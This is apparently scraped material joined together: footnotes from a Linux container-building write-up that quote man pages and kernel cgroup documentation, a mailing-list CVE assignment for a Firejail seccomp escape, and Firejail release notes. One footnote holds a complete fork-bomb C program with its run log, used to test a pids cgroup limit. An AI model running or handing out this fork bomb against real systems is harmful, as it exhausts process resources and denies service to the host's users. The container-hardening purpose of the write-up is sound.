                char    f_fpack[6];   /* Filsys pack name */

            The  last   two  fields,   f_fname  and  f_fpack,   are  not
            implemented  and  will  always  be filled  with  null  bytes
            ('\0').

```

[70](#fnr.70)
Listing 142: [`man 2 sysfs`](http://man7.org/linux/man-pages/man2/sysfs.2.html)
```
    SYSFS(2) -- 2010-06-27 -- Linux -- Linux Programmer's Manual

    NAME
            sysfs - get filesystem type information

    SYNOPSIS
            int sysfs(int option, const char *fsname);

            int sysfs(int option, unsigned int fs_index, char *buf);

            int sysfs(int option);

    DESCRIPTION
            sysfs()  returns  information  about  the  filesystem  types
            currently present in  the kernel.  The specific  form of the
            sysfs()  call and  the information  returned depends  on the
            option in effect:

            1  Translate the filesystem identifier  string fsname into a
               filesystem type index.

            2  Translate  the  filesystem  type index  fs_index  into  a
               null-terminated   filesystem  identifier   string.   This
               string will be  written to the buffer pointed  to by buf.
               Make sure that buf has enough space to accept the string.

            3  Return  the total  number of  filesystem types  currently
               present in the kernel.

            The  numbering of  the filesystem  type indexes  begins with
            zero.

```

[71](#fnr.71)
Listing 150: [`man 2 uselib`](http://man7.org/linux/man-pages/man2/uselib.2.html)
```
USELIB(2) -- 2016-03-15 -- Linux -- Linux Programmer's Manual

NAME
	uselib - load shared library

	[..]

NOTES
	[...]

	Since Linux  3.15, this system  call is available  only when
	the kernel is configured with the CONFIG_USELIB option.

```

[72](#fnr.72)
Listing 148: [`man 2 sync_file_range2`](http://man7.org/linux/man-pages/man2/sync_file_range2.2.html)
```
SYNC_FILE_RANGE(2) -- 2014-08-19 -- Linux -- Linux Programmer's Manual

NAME
	sync_file_range - sync a file segment with disk

	[...]
NOTES

   sync_file_range2()
	Some   architectures  (e.g.,   PowerPC,  ARM)   need  64-bit
	arguments to be aligned in a suitable pair of registers.  On
	such architectures, the  call signature of sync_file_range()
	shown in the SYNOPSIS would force a register to be wasted as
	padding  between   the  fd   and  offset   arguments.   (See
	syscall(2)  for  details.)  Therefore,  these  architectures
	define  a different  system call  that orders  the arguments
	suitably:

	    int sync_file_range2(int fd, unsigned int flags,
						off64_t offset, off64_t nbytes);

	The behavior  of this system  call is otherwise  exactly the
	same as sync_file_range().

```

[73](#fnr.73)
Listing 147: [`man 2 readdir`](http://man7.org/linux/man-pages/man2/readdir.2.html)
```
READDIR(2) -- 2013-06-21 -- Linux -- Linux Programmer's Manual

NAME
	readdir - read directory entry

SYNOPSIS

	int readdir(unsigned int fd, struct old_linux_dirent *dirp,
			  unsigned int count);

	Note: There  is no glibc  wrapper for this system  call; see
	NOTES.

DESCRIPTION
	This is  not the  function you are  interested in.   Look at
	readdir(3)  for the  POSIX conforming  C library  interface.
	This page  documents the bare kernel  system call interface,
	which is superseded by getdents(2).

	readdir()  reads  one  old_linux_dirent structure  from  the
	directory referred  to by  the file  descriptor fd  into the
	buffer pointed to  by dirp.  The argument  count is ignored;
	at most one old_linux_dirent structure is read.

```

[74](#fnr.74)
Listing 168: [`man 2 kexec_file_load`](http://man7.org/linux/man-pages/man2/kexec_file_load.2.html)
```
NAME
	kexec_load, kexec_file_load  - load  a new kernel  for later
	execution
	[...]
ERRORS
	[...]
	EPERM
		The caller does not have the CAP_SYS_BOOT capability.

```

[75](#fnr.75)
Listing 166: [`man 2 nice`](http://man7.org/linux/man-pages/man2/nice.2.html)
```
NICE(2) -- 2016-03-15 -- Linux -- Linux Programmer's Manual

NAME
	nice - change process priority

	[...]
ERRORS

	EPERM
		The calling process attempted  to increase its priority
		by  supplying  a  negative  inc  but  has  insufficient
		privileges.  Under  Linux, the  CAP_SYS_NICE capability
		is   required.   (But   see  the   discussion  of   the
		RLIMIT_NICE resource limit in setrlimit(2).)

```

[76](#fnr.76)
Listing 157: [`man 2 perfmonctl`](http://man7.org/linux/man-pages/man2/perfmonctl.2.html)
```
PERFMONCTL(2) -- 2013-02-13 -- Linux -- Linux Programmer's Manual

NAME
	perfmonctl - interface to IA-64 performance monitoring unit

	[...]

CONFORMING TO
	perfmonctl() is Linux-specific and  is available only on the
	IA-64 architecture.

```

[77](#fnr.77)
Listing 156: [`man 2 syscalls`](http://man7.org/linux/man-pages/man2/syscalls.2.html)
```
	ppc_rtas(2)	2.6.2	PowerPC only

```

[78](#fnr.78)
Listing 152: [`man 2 spu_create`](http://man7.org/linux/man-pages/man2/spu_create.2.html)
```
SPU_CREATE(2) -- 2015-12-28 -- Linux -- Linux Programmer's Manual

NAME
	spu_create - create a new spu context

SYNOPSIS
	#include <sys/types.h>
	#include <sys/spu.h>

	int spu_create(const char *pathname, int flags, mode_t mode);
	int spu_create(const char *pathname, int flags, mode_t mode,
				int neighbor_fd);

	Note: There  is no glibc  wrapper for this system  call; see
	NOTES.

DESCRIPTION
	The  spu_create() system  call is  used on  PowerPC machines
	that  implement the  Cell Broadband  Engine Architecture  in
	order  to access  Synergistic  Processor  Units (SPUs).   It
	creates a  new logical  context for an  SPU in  pathname and
	returns a file descriptor associated with it.  pathname must
	refer to a  nonexistent directory in the mount  point of the
	SPU filesystem  (spufs).  If  spu_create() is  successful, a
	directory is  created at pathname  and it is  populated with
	the files described in spufs(7).

```

[79](#fnr.79)
Listing 153: [`man 2 spu_run`](http://man7.org/linux/man-pages/man2/spu_run.2.html)
```
SPU_RUN(2) -- 2012-08-05 -- Linux -- Linux Programmer's Manual

NAME
	spu_run - execute an SPU context

SYNOPSIS
	#include <sys/spu.h>

	int spu_run(int fd, unsigned int *npc, unsigned int *event);

	Note: There  is no glibc  wrapper for this system  call; see
	NOTES.

DESCRIPTION
	The spu_run() system  call is used on  PowerPC machines that
	implement the Cell Broadband Engine Architecture in order to
	access Synergistic Processor Units  (SPUs).  The fd argument
	is a  file descriptor returned by  spu_create(2) that refers
	to a specific SPU context.   When the context gets scheduled
	to a  physical SPU, it  starts execution at  the instruction
	pointer passed in npc.

```

[80](#fnr.80)
Listing 151: [`man 2 subpage_prot`](http://man7.org/linux/man-pages/man2/subpage_prot.2.html)
```
SUBPAGE_PROT(2) -- 2012-07-13 -- Linux -- Linux Programmer's Manual

NAME
	subpage_prot -  define a  subpage protection for  an address
	range

	[...]

VERSIONS
	This  system call  is provided  on the  PowerPC architecture
	since Linux 2.6.25.  The system call is provided only if the
	kernel is configured  with CONFIG_PPC_64K_PAGES.  No library
	support is provided.

```

[81](#fnr.81)
Listing 149: [`man 2 syscalls`](http://man7.org/linux/man-pages/man2/syscalls.2.html)
```
	utrap_install(2)	2.2	Sparc only

```

[82](#fnr.82)
Listing 144: [`man 2 syscalls`](http://man7.org/linux/man-pages/man2/syscalls.2.html)
```
	kern_features(2)	3.7	Sparc64

```

This is pretty vague, so I looked at the source. It's only mentioned
in an Sparc64-specific file:

Listing 145: [`arch/sparc/kernel/sys_sparc_64.c:648@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/arch/sparc/kernel/sys_sparc_64.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n648)
```
asmlinkage long sys_kern_features(void)
{
	return KERN_FEATURE_MIXED_MODE_STACK;
}

```

[83](#fnr.83)
Listing 155: [`man 2 preadv2`](http://man7.org/linux/man-pages/man2/preadv2.2.html)
```
DESCRIPTION
	The readv() system  call reads iovcnt buffers  from the file
	associated  with the  file  descriptor fd  into the  buffers
	described by iov ("scatter input").

	The  writev()  system call  writes  iovcnt  buffers of  data
	described  by  iov to  the  file  associated with  the  file
	descriptor fd ("gather output").

	[...]

	The readv() system call works  just like read(2) except that
	multiple buffers are filled.

	The  writev() system  call works  just like  write(2) except
	that multiple buffers are written out.

	[...]

   preadv() and pwritev()
	The  preadv()  system  call combines  the  functionality  of
	readv() and pread(2).  It performs the same task as readv(),
	but adds a fourth argument, offset, which specifies the file
	offset at which the input operation is to be performed.

	The  pwritev() system  call  combines  the functionality  of
	writev()  and  pwrite(2).   It  performs the  same  task  as
	writev(),  but   adds  a  fourth  argument,   offset,  which
	specifies the file  offset at which the  output operation is
	to be performed.

	The file offset  is not changed by these  system calls.  The
	file referred to by fd must be capable of seeking.

   preadv2() and pwritev2()

	These  system calls  are similar  to preadv()  and pwritev()
	calls, but add  a fifth argument, flags,  which modifies the
	behavior on a per-call basis.

	Unlike preadv() and pwritev(), if the offset argument is -1,
	then the current file offset is used and updated.

	The flags argument contains a bitwise  OR of zero or more of
	the following flags:

	RWF_DSYNC (since Linux 4.7)
		Provide a  per-write equivalent of the  O_DSYNC open(2)
		flag.  This flag is meaningful only for pwritev2(), and
		its effect  applies only to  the data range  written by
		the system call.

	RWF_HIPRI (since Linux 4.6)
		High    priority   read/write.     Allows   block-based
		filesystems  to  use  polling   of  the  device,  which
		provides   lower  latency,   but  may   use  additional
		resources.  (Currently, this feature  is usable only on
		a file descriptor opened using the O_DIRECT flag.)

	RWF_SYNC (since Linux 4.7)
		Provide a  per-write equivalent  of the  O_SYNC open(2)
		flag.  This flag is meaningful only for pwritev2(), and
		its effect  applies only to  the data range  written by
		the system call.

```

[84](#fnr.84)

This isn't just a denial-of-service concern. If a process consumes a
lot of memory, and has a better `badness` score than some other
critical host-side process, the host-side process will be killed by
the kernel's out-of-memory killer.

The badness score favors longer-running processes, among other things:

["Taming the OOM Killer"](https://lwn.net/Articles/317814/) on LWN:

> The process to be killed in an out-of-memory situation is selected
> based on its badness score. The badness score is reflected in
> /proc/<pid>/oom\_score. This value is determined on the basis that
> the system loses the minimum amount of work done, recovers a large
> amount of memory, doesn't kill any innocent process eating tons of
> memory, and kills the minimum number of processes (if possible
> limited to one). The badness score is computed using the original
> memory size of the process, its CPU time (utime + stime), the run
> time (uptime - start time) and its oom\_adj value. The more memory
> the process uses, the higher the score. The longer a process is
> alive in the system, the smaller the score.

I haven't demonstrated it, but I believe this could manipulated to
cause a screen lock program to be killed, for example. It's not
unheard of for e.g. xscreensaver to leak memory:

["gltext seems to leak memory eventually causing oom-killer to run"](https://bugs.launchpad.net/ubuntu/%2Bsource/xscreensaver/%2Bbug/768032):

> gltext is consuming large amounts of memory. Often being killed by
> oom-killer but eventually causing me not to be able to log into my
> computer disabling gltext from the list of possible screensavers
> caused the problem to go away.

There's even an open Ubuntu xscreensaver bug to make the OOM killer
**more likely** to kill xscreensaver. This seems like the wrong
direction to me….

["xscreensaver does not protect the system against its children"](https://bugs.launchpad.net/ubuntu/%2Bsource/xscreensaver/%2Bbug/807685):

> The thing is, a screensaver is **NOT** a critically important part of
> the system. It should die early if it is a resource hog. All you have
> to do is write "10" into /proc/PID/oom\_adj and Bob's your uncle. Until
> then, Xscreensaver is failing its duties.

[85](#fnr.85)
Listing 174: [`man 7 cgroup_namespaces`](http://man7.org/linux/man-pages/man7/cgroup_namespaces.7.html)
```
	Cgroup namespaces virtualize the view of a process's cgroups
	(see   cgroups(7))  as   seen  via   /proc/[pid]/cgroup  and
	/proc/[pid]/mountinfo.

	Each  cgroup  namespace  has  its own  set  of  cgroup  root
	directories,  which are  the  base points  for the  relative
	locations displayed  in /proc/[pid]/cgroup.  When  a process
	creates a new cgroup  namespace using clone(2) or unshare(2)
	with  the  CLONE_NEWCGROUP  flag,  it enters  a  new  cgroup
	namespace in  which its  current cgroups  directories become
	the  cgroup root  directories of  the new  namespace.  (This
	applies both for  the cgroups version 1  hierarchies and the
	cgroups version 2 unified hierarchy.)

```

[86](#fnr.86)
Listing 175: [`Documentation/cgroup-v1/memory.txt@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/Documentation/cgroup-v1/memory.txt?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3)
```
Brief summary of control files.
[...]
 memory.limit_in_bytes		 # set/show limit of memory usage

```

[87](#fnr.87)
Listing 176: [`Documentation/cgroup-v1/memory.txt@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/Documentation/cgroup-v1/memory.txt?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3)
```
Brief summary of control files.
[...]
 memory.kmem.limit_in_bytes      # set/show hard limit for kernel memory

```

[88](#fnr.88)
Listing 179: [`man 7 cgroups`](http://man7.org/linux/man-pages/man7/cgroups.7.html)
```
   Cgroups version 1 controllers
	Each of the  cgroups version 1 controllers is  governed by a
	kernel configuration  option (listed  below).  Additionally,
	the availability of  the cgroups feature is  governed by the
	CONFIG_CGROUPS kernel configuration option.

	cpu (since Linux 2.6.24; CONFIG_CGROUP_SCHED)
		Cgroups  can be  guaranteed  a minimum  number of  "CPU
		shares" when a  system is busy.  This does  not limit a
		cgroup's CPU usage if the CPUs are not busy.

		Further information  can be found in  the kernel source
		file Documentation/scheduler/sched-bwc.txt.

```

[89](#fnr.89)
Listing 177: [`Documentation/cgroup-v1/pids.txt@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/Documentation/cgroup-v1/pids.txt?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3)
```
						   Process Number Controller
						   =========================

Abstract
--------

The process number controller is used to allow a cgroup hierarchy to stop any
new tasks from being fork()'d or clone()'d after a certain limit is reached.

Since it is trivial to hit the task limit without hitting any kmemcg limits in
place, PIDs are a fundamental resource. As such, PID exhaustion must be
preventable in the scope of a cgroup hierarchy by allowing resource limiting of
the number of tasks in a cgroup.

Usage
-----

In order to use the `pids` controller, set the maximum number of tasks in
pids.max (this is not available in the root cgroup for obvious reasons). The
number of processes currently in the cgroup is given by pids.current.

```

for example,

Listing 178: `forkbomb.c`
```
/* -*- compile-command: "gcc -Wall -Werror -static forkbomb.c -o forkbomb" -*- */
#include <stdio.h>
#include <unistd.h>
#include <errno.h>

int main (int argc, char  **argv)
{
	switch (fork()) {
	case -1:
		fprintf(stderr, "++ couldn't even fork once: %m\n");
		return 1;
	case 0:
		while (1) {
			switch (fork()) {
			case -1:
				break;
			case 0:
				fprintf(stderr, "++ successful fork.\n");
				break;
			default:
				break;

			}
		}
		break;
	default:
		while (1) sleep(1);
		break;
	}
	return 0;
}

```
```

[lizzie@empress l-c-i-500-l]$ sudo ./contained -m . -u 0 -c forkbomb
=> validating Linux version...4.7.10.201610222037-1-grsec on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> setting rlimit...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.0sOZgF...done.
=> trying a user namespace...writing /proc/2184/uid_map...writing /proc/2184/gid_map...done.
=> switching to uid 0 / gid 0...done.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
++ successful fork.
C-c C-c

```

[90](#fnr.90)
Listing 180: [`Documentation/cgroup-v1/blkio-controller.txt@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/Documentation/cgroup-v1/blkio-controller.txt?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3)
```
Details of cgroup files
=======================
Proportional weight policy files
--------------------------------
- blkio.weight
	- Specifies per cgroup weight. This is default weight of the group
	  on all the devices until and unless overridden by per device rule.
	  (See blkio.weight_device).
	  Currently allowed range of weights is from 10 to 1000.

```

[91](#fnr.91)
Listing 182: [`man 7 cgroups`](http://man7.org/linux/man-pages/man7/cgroups.7.html)
```
   Creating cgroups and moving processes
	A cgroup filesystem initially contains a single root cgroup,
	'/', which all processes belong to.  A new cgroup is created
	by creating a directory in the cgroup filesystem:

	    mkdir /sys/fs/cgroup/cpu/cg1

	This creates a new empty cgroup.

	A process  may be moved  to this  cgroup by writing  its PID
	into the cgroup's cgroup.procs file:

	    echo $$ > /sys/fs/cgroup/cpu/cg1/cgroup.procs

	Only one PID at a time should be written to this file.

	Writing  the  value 0  to  a  cgroup.procs file  causes  the
	writing process to be moved to the corresponding cgroup.

	When writing a PID into the cgroup.procs, all threads in the
	process are moved into the new cgroup at once.

	Within a hierarchy, a process can be a member of exactly one
	cgroup.   Writing a  process's  PID to  a cgroup.procs  file
	automatically removes  it from  the cgroup  of which  it was
	previously a member.

	The cgroup.procs  file can be read  to obtain a list  of the
	processes that are  members of a cgroup.   The returned list
	of  PIDs is  not  guaranteed  to be  in  order.   Nor is  it
	guaranteed to  be free of  duplicates.  (For example,  a PID
	may be recycled while reading from the list.)

	In cgroups v1 (but not cgroups v2), an individual thread can
	be moved to  another cgroup by writing its  thread ID (i.e.,
	the kernel thread ID returned  by clone(2) and gettid(2)) to
	the tasks file in a cgroup directory.  This file can be read
	to  discover the  set of  threads  that are  members of  the
	cgroup.  This file is not present in cgroup v2 directories.

```

[92](#fnr.92)
Listing 184: [`man 2 setrlimit`](http://man7.org/linux/man-pages/man2/setrlimit.2.html)
```
	The soft limit is the value that the kernel enforces for the
	corresponding resource.   The hard  limit acts as  a ceiling
	for the soft limit: an unprivileged process may set only its
	soft limit  to a value  in the range from  0 up to  the hard
	limit,  and   (irreversibly)  lower   its  hard   limit.   A
	privileged    process   (under    Linux:   one    with   the
	CAP_SYS_RESOURCE capability)  may make arbitrary  changes to
	either limit value.

```

[93](#fnr.93)
Listing 186: [`Documentation/cgroup-v1/cgroups.txt@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/Documentation/cgroup-v1/cgroups.txt?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3)
```
1.4 What does notify_on_release do ?
------------------------------------

If the notify_on_release flag is enabled (1) in a cgroup, then
whenever the last task in the cgroup leaves (exits or attaches to
some other cgroup) and the last child cgroup of that cgroup
is removed, then the kernel runs the command specified by the contents
of the "release_agent" file in that hierarchy's root directory,
supplying the pathname (relative to the mount point of the cgroup
file system) of the abandoned cgroup.  This enables automatic
removal of abandoned cgroups.  The default value of
notify_on_release in the root cgroup at system boot is disabled
(0).  The default value of other cgroups at creation is the current
value of their parents' notify_on_release settings. The default value of
a cgroup hierarchy's release_agent path is empty.

```

It's annoying to set the release agent on a per-container basis, so
we'll avoid it.

[94](#fnr.94)
Listing 188: ["Cross-Container ARP Poisoning"](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1548497), an LXC bug report by Jesse Hertz of NCCGroup
```
Description:

An unprivileged LXC container can conduct an ARP spoofing attack
against another unprivileged LXC container running on the same
host. This allows man-in-the-middle attacks on another container's
traffic.

Recommendation:

Due to the complex nature of this involving the Linux bridge
interface, NCC is not aware of an easy fix. We suggest involving the
kernel networking team to allow for ARP restrictions on virtual bridge
interfaces. Using ebtables to block and control link layer traffic may
also be an effective fix. Documentation should reflect the risks of
not using any future protections or ebtables.

StÃ©phane Graber (stgraber) wrote on 2016-02-22:	#1
Hi,

Thanks for the report. This is not exactly news to us and has been
mentioned publicly a few times.

Our usual answer to this is that if you don't trust your users, you
shouldn't grant them access to a shared bridge, instead setup a
separate bridge for them.

MAC filtering through ebtables is an option but the problem with this
approach is that it essentially prevents container nesting as that
would lead to more than one MAC being used by the container which
ebtables would block.

[...]

On a local system, our answer to that is as I said to either trust
everyone you give access to a shared bridge or to segment traffic by
using multiple bridges.

```

[95](#fnr.95)
Listing 189: [`man 7 cgroups`](http://man7.org/linux/man-pages/man7/cgroups.7.html)
```
   Cgroups version 1 controllers
	Each of the  cgroups version 1 controllers is  governed by a
	kernel configuration  option (listed  below).  Additionally,
	the availability of  the cgroups feature is  governed by the
	CONFIG_CGROUPS kernel configuration option.
[...]

	net_prio (since Linux 3.3; CONFIG_CGROUP_NET_PRIO)
		This  allows priorities  to be  specified, per  network
		interface, for cgroups.

		Further information  can be found in  the kernel source
		file Documentation/cgroup-v1/net_prio.txt.

```



=== Content from www.openwall.com_f642fb7d_20250124_234003.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](4) [[next>]](6) [[<thread-prev]](4) [[thread-next>]](6) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <1d5f6a4116104bdd8da6527c64bfd588@imshyb02.MITRE.ORG>
Date: Sat, 7 Jan 2017 12:53:23 -0500
From: <cve-assign@...re.org>
To: <_@...zie.io>
CC: <cve-assign@...re.org>, <oss-security@...ts.openwall.com>
Subject: Re: Firejail local root exploit

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

> allows ptrace with --allow-debuggers, which allows a
> sandboxed program to escape the seccomp profile by rewriting permitted
> system calls into unpermitted ones pre-Linux-4.8.
>
> <https://github.com/netblue30/firejail/commit/6b8dba29d73257311564ee7f27b9b14758cc693e>

Use CVE-2017-5206.

- --
CVE Assignment Team
M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
[ A PGP key is available for encrypted communications at
  <http://cve.mitre.org/cve/request_id.html> ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCAAGBQJYcSqVAAoJEHb/MwWLVhi2NzwP/0z1VLyt3ZjtWZJ/LO4/9eFK
Y3r7DhndVjzW0ly7NN3IJSYdtLplmxl8j5oJsOhviUClRrbAos2LBHmOTUM/vfFj
nyun6Lil9yuoktXnqTTRDGV+bhqABxi8HJ0I8iC6XMFOS+HrHNMZxcPUbNROFKxM
CcmFClQ8/EY4ZqJKdglwdEDFzKO9xUzoFdSVMfVRGjCQz6WSnEtG/Ab/6v+e3VLZ
ZSKJarpbnQ0M3IXALpu+jQ5/pfg9bZu4GyL6rTK46GCHnC//Rjw0E1yF7ryebVBC
TSrp9j8AggY+ZH90AYDFS5Z9ya58QRUeTm0zuLTPiqFhZakFp0ZhHmFB6wW+/VDY
yEJM0akAzMTiljFhePJRNrA0BuCYAJSDD15vV52IrYNBO9U+bCugLDTC3Nmt5OrJ
V8lUM2uYlTg3q/8y3sWeVW+7O2khsDdt4Pan6c0QXs9Nstr70iGsRKzg/q9rE45s
2IaE54OkYN8znmLpSVmPUSc5uHOIkyLky/7EKN5jgoIdbmAVwKgCOIQwBkCP25if
OZesiYfVCnca+rArzCR3GbPZhqDPYQcyj6iRt1Z7lUEvrRPKPwdyHCZZpQUklBYc
jUlabDWSPYZNEpmefnuKRK91m3CRDmgWGXdSaHOxeaq0Ip+H6DR36tIT8lQnGZHv
ZkitBU93h9QWYAMHXjmd
=SPiX
-----END PGP SIGNATURE-----

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from firejail.wordpress.com_a0a8a31a_20250124_234006.html ===

# [Firejail](https://firejail.wordpress.com/ "Firejail")

## security sandbox

Menu
[Skip to content](#content "Skip to content")

* [About](https://firejail.wordpress.com/)
* [Download](https://firejail.wordpress.com/download-2/)
  + [Release Notes](https://firejail.wordpress.com/download-2/release-notes/)
  + [CVE Status](https://firejail.wordpress.com/download-2/cve-status/)
* [Features](https://firejail.wordpress.com/features-3/)
* [Documentation](https://firejail.wordpress.com/documentation-2/)
  + [Firejail Usage](https://firejail.wordpress.com/documentation-2/basic-usage/)
  + [All About Tor](https://firejail.wordpress.com/all-about-tor/)
  + [AppImage Support](https://firejail.wordpress.com/documentation-2/appimage-support/)
  + [Building Custom Profiles](https://firejail.wordpress.com/documentation-2/building-custom-profiles/)
  + [Firefox Sandboxing Guide](https://firejail.wordpress.com/documentation-2/firefox-guide/)
  + [Linux Capabilities Guide](https://firejail.wordpress.com/documentation-2/linux-capabilities-guide/)
  + [Linux Mint Sandboxing Guide](https://firejail.wordpress.com/2017/05/15/linux-mint-sandboxing-guide/)
  + [Seccomp Guide](https://firejail.wordpress.com/documentation-2/seccomp-guide/)
  + [X11 Guide](https://firejail.wordpress.com/documentation-2/x11-guide/)
* [Support](https://firejail.wordpress.com/support/)
* [Blog](https://firejail.wordpress.com/blog/)

[![](https://firejail.wordpress.com/wp-content/uploads/2021/01/newlogo.png)](https://firejail.wordpress.com/)

# Release Notes

```
firejail (0.9.72) baseline; urgency=low
  * feature: On failing to remount a fuse filesystem, give warning instead of
    erroring out (#5240 #5242)
  * feature: Update syscall tables and seccomp groups (#5188)
  * feature: improve force-nonewprivs security guarantees (#5217 #5271)
  * feature: add support for restricting the creation of Linux namespaces
    (--restrict-namespaces, --restrict-namespaces=), implemented as a seccomp
    filter for both 64 and 32 bit architectures (#4939 #5259)
  * feature: add support for custom AppArmor profiles (--apparmor=) (#5274
    #5316 #5317 #5475)
  * feature: add support for ICMP in nettrace
  * feature: add --dnstrace, --icmptrace, and --snitrace commands
  * feature: Add basic gtksourceview language-spec (file type detection/syntax
    highlighting for profiles) (#5502)
  * feature: add restrict-namespaces to (almost) all applicable profiles (#5440
    #5537)
  * feature: add support for netlock in profile files
  * modif: removed --cgroup= command (#5190 #5200)
  * modif: set --shell=none as the default (#5190)
  * modif: removed --shell= command (#5190 #5196 #5209)
  * modif: disabled firetunnel by default in configure.ac (#5190)
  * modif: disabled chroot by default in /etc/firejail/firejail.config (#5190)
  * modif: disabled private-lib by default in /etc/firejail/firejail.config
    (#5190 #5216)
  * modif: disabled tracelog by default in /etc/firejail/firejail.config
    (#5190)
  * modif: removed grsecurity support
  * modif: stop hiding blacklisted files in /etc by default and add a new
    etc-hide-blacklisted option to firejail.config that enables the previous
    behavior (disabled by default) (#5010 #5230 #5591 #5595)
  * bugfix: Flood of seccomp audit log entries (#5207)
  * bugfix: --netlock does not work (Error: no valid sandbox) (#5312)
  * build: deduplicate configure-time vars into new config files (#5140 #5284)
  * build: fix file mode of shell scripts (644 -> 755) (#5206)
  * build: reduce autoconf input files from 32 to 2 (#5219)
  * build: add dist build directory to .gitignore (#5248)
  * build: add autoconf auto-generation comment to input files (#5251)
  * build: Add files make uninstall forgot to remove (#5283)
  * build: add and use TARNAME instead of NAME for paths (#5310)
  * build: only install ids.config when --enable-ids is set (#5356 #5357)
  * build: Remove deprecated syntax and modernize shell test scripts (#5370)
  * build: Fix musl warnings (#5421 #5431)
  * build: sort.py improvements (#5429)
  * build: deduplicate makefiles (#5478)
  * build: fix formatting and misc in configure (#5488)
  * build: actually set LDFLAGS/LIBS & stop overriding CFLAGS/LDFLAGS (#5504)
  * build: make shell commands more portable in firejail.vim (#5577)
  * ci: bump ubuntu to 22.04 and use newer compilers / analyzers (#5275)
  * ci: ignore git-related paths and the project license (#5249)
  * ci: Harden GitHub Actions (StepSecurity) (#5439)
  * ci: sort and ignore more paths (#5481)
  * ci: whitelist needed endpoints and block access to sudo (#5485)
  * docs: fix typos (#5189 #5349)
  * docs: mention risk of SUID binaries and also firejail-users(5) (#5288
    #5290)
  * docs: set vim filetype on man pages for syntax highlighting (#5296)
  * docs: note that blacklist/whitelist follow symlinks (#5344)
  * docs: Add IRC channel info to README.md (#5361)
  * docs: man: Note that some commands can be disabled in firejail.config
    (#5366)
  * docs: Add gist note to bug_report.md (#5398)
  * docs: clarify that --appimage should appear before --profile (#5402 #5451)
  * docs: add more Firefox examples to the firejail-local AppArmor profile
    (#5493)
  * docs: Fix broken Restrict-DBus wiki link on profile.template (#5554)
  * docs: Remove invalid --profile-path from --help (#5585 #5586)
  * several new profiles
